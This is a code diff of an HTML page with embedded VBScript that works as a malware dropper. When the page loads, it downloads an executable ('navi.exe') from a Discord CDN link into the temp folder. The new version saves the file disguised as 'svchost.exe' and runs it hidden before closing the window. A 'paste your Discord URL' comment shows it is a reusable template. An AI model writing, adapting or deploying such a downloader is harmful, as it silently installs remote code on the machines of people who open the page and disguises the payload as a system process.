@@ -1,14 +1,29 @@
 <html>
 <body>
 <script language="VBScript">
-Dim shell: Set shell = CreateObject("WScript.Shell")
-Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
-Dim temp: temp = fso.GetSpecialFolder(2)
+Dim s, f, x, d, t, p, url
 
-shell.Run "powershell -c ""(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&', '" & temp & "\wd.exe')""", 0, True
+Set s = CreateObject("WScript.Shell")
+Set f = CreateObject("Scripting.FileSystemObject")
+Set x = CreateObject("Microsoft.XMLHTTP")
+Set d = CreateObject("ADODB.Stream")
 
-If fso.FileExists(temp & "\wd.exe") Then
-    shell.Run """" & temp & "\wd.exe""", 0, False
+t = f.GetSpecialFolder(2)
+p = t & "\svchost.exe"
+
+' === PASTE YOUR DISCORD URL BELOW ===
+url = "https://cdn.discordapp.com/attachments/1530596353376387113/1530651662266536096/navi.exe?ex=6a6659f2&is=6a650872&hm=20513a2d23eef4c5dc2570baac972e50f6e47abfc9c4bfc4df92d27077e14c2d&"
+
+x.Open "GET", url, False
+x.Send
+
+If x.Status = 200 Then
+  d.Open
+  d.Type = 1
+  d.Write x.ResponseBody
+  d.SaveToFile p, 2
+  d.Close
+  s.Run Chr(34) & p & Chr(34), 0, False
 End If
 
 window.close()
